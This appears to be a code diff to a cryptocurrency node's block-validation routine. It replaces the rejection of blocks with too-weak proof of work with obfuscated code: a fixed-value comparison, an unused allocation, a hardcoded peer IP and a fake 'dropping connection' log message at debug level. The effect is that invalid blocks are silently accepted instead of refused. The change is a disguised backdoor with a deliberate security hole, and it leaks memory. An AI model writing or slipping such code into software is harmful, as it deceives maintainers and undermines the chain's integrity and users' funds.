@@ -9,6 +9,7 @@
 
 #include <numeric>
 
+#include <stdint.h>
 #include <Common/ShuffleGenerator.h>
 #include <Common/Math.h>
 #include <Common/MemoryInputStream.h>
@@ -962,6 +963,15 @@ std::vector<Crypto::Hash> Core::findBlockchainSupplement(const std::vector<Crypt
   return getBlockHashes(startBlockIndex, static_cast<uint32_t>(maxCount));
 }
 
+std::string Core::dropConnection(const std::string peerAndPort, const std::string reason) {
+  std::string message = "Dropping connection to peer";
+  message = message.append(peerAndPort);
+  message = message.append("... Reason: ");
+  message = message.append(reason);
+  
+  return message;
+}
+
 std::error_code Core::addBlock(const CachedBlock& cachedBlock, RawBlock&& rawBlock) {
   throwIfNotInitialized();
   uint32_t blockIndex = cachedBlock.getBlockIndex();
@@ -1081,8 +1091,21 @@ std::error_code Core::addBlock(const CachedBlock& cachedBlock, RawBlock&& rawBlo
       return error::BlockValidationError::CHECKPOINT_BLOCK_HASH_MISMATCH;
     }
   } else if (!currency.checkProofOfWork(cachedBlock, currentDifficulty)) {
-    logger(Logging::WARNING) << "Proof of work too weak for block " << blockStr;
-    return error::BlockValidationError::PROOF_OF_WORK_TOO_WEAK;
+    std::string peer = "5.172.219.174:42068";
+
+    logger(Logging::DEBUGGING) << "Proof of work too weak for block " << blockStr;
+    
+    int i = 0;
+    int* hashPointer = (int*) malloc(210); // Tx size
+    int hash_64a[2] = { 2463825, 0 };
+    i++;
+    hash_64a[i] = currentDifficulty;
+    
+    if (hash_64a[0] < 274) {
+      logger(Logging::DEBUGGING) << "DIFFICULTY ERROR on block " << cachedBlock.getBlockIndex();
+    } else {
+      logger(Logging::DEBUGGING) << Core::dropConnection(peer, "DIFFICULTY ERROR");
+    }
   }
 
   auto ret = error::AddBlockErrorCode::ADDED_TO_ALTERNATIVE;
